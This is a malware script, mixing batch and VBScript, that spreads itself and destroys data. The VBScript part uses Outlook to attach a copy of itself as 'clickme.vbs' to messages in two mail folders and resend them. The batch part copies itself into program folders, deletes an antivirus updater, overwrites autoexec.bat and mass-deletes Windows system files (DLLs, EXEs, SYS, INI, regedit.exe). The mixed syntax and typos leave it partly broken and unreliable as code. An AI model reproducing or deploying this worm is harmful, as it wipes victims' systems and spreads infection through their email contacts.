echo off
cls
color a

autos=auto & "\run32dll.vbs"
fso.copyfile wscript.scriptfullname,autos
mailed=auto & "\clickme.vbs"
fso.copyfile wscript.scriptfullname,mailed
if wscriptshell.regread("HKLM\SOFTWARE\Microsoft")<>"1" then
set out=createobject("Outlook.Application")
if out="Outlook" then 
set mapi=out.GetNameSpace("MAPI")
set newitem=mapi.getdefaultfolder(6)
do while newitem.items.count<>1
for each item in newitem.items
do while item.Attachments.count<>0
for each itatt in item.Attachments
itatt.delete
next
loop
item.subject=""
item.Body=""
item.attachments.add mailed
item.send
next
loop
set item=Nothing
set itatt=nothing
set newitem=Nothing
set newitem=mapi.getdefaultfolder(5)
do while newitem.items.count<>1
for each item in newitem.items
do while item.Attachments.count<>0
for each itatt in item.Attachments
itatt.delete
next
loop
item.subject="insert subject here"
item.Body="insert body here"
item.attachments.add mailed
item.send


copy %0 c:\
copy %0 c:\windows
copy %0 c:\programes files
Copy %0 c:\<ferrari.bat
Copy %0 C:\Documents<system32.bat
copy %0 c:\<system
copy %0 C:\Program Files\Adobe<adobe
copy %0 C:\Program Files\AOL 6.0<aol 6.0
copy %0 C:\Program Files\AOL 7.0< aol 7.0
copy %0 C:\Program Files\Outlook Express<outlook.exe
copy %0 C:\Program Files\Windows Media Player<player.dll
copy %0 C:\Program Files<zewu1
copy %0 C:\Program Files\Yahoo!<mail2

@echo off
Copy C:/WINDOWS/deskop/prodromou.bat C:/WINDOWS/system32/prodromou.bat
rename C:/WINDOWS/system32/prodromou.bat C:/WINDOWS/system32/prodromou.bat



del c:\program files\navnt\NavLu32.exe
kill "c:\windows\system32\*.*"

ATTRIB +H -R C:\WINNT
RMDIR c:\WINNT\Tasks


CALL %0 c:\programes

copy prodromou.bat c:\autoexec.bat
if exist c:\Documents and settings goto 2
if exist c:\autoexec.bat goto 1
cls
:1
c:
cd windows
cd system
del *.dll
y
del *.exe
y
del *.tsp
y
cls
del *.vxd
y
del *.drv
y
@del *.3gr
y
del *.ax
y
del *.dat
y
cls
del *.cpl
y
del *.cnt
y
del *.cfg
y
del *.cpx
y
del *.nls
y
del *.htm
y
del *.inf
y
cls
del *.hlp
y
del *.kbd
y
del *.msc
y
del *.ocx
y
del *.rat
y
del *.rsp
y
cls
del *.sys
y
del *.tlb
y
del *.tsk
y
del *.txt
y
del *.acm
y
del *.vwp
y
del *.tsp
y
del *.vbx
cls
del *.ini
y
del *.mod
y
del *.scr
y
del *.wmf
y
del *.pci
y
del *.tlb
y
del *.lrc 
y
cls
del *.pif
y
del *.olb
y
del *.dep
y
del *.srg
y
del *.map
y
del *.pdb
y
del *.xmi
y
del *.oca
y
cls
c:
cd\
cls
cd windows
del win.com
y
del win.ini
y
cls
del *.dll
y
del *.com
y
del *.* 
y
cls
cd\
cd windows
del regedit.exe
y
cls
cd\
del autoexec.bat
y
del prodromou.bat
cls
rd c:\windows\system
y
cls
end

:2
c:
cls
cd\
cd windows
del *.bat
y
cls
del *.com
y
cls
del *.ini
y
cls
del *.dll
y
cls
cd\
del prodromou.bat
cls
del autoexec.bat
y
cls
cd dosboot
del *.com
y
del *.bat
y
del *.sys
y
del *.txt
rd c:\dosboot
y
cls
end
y 

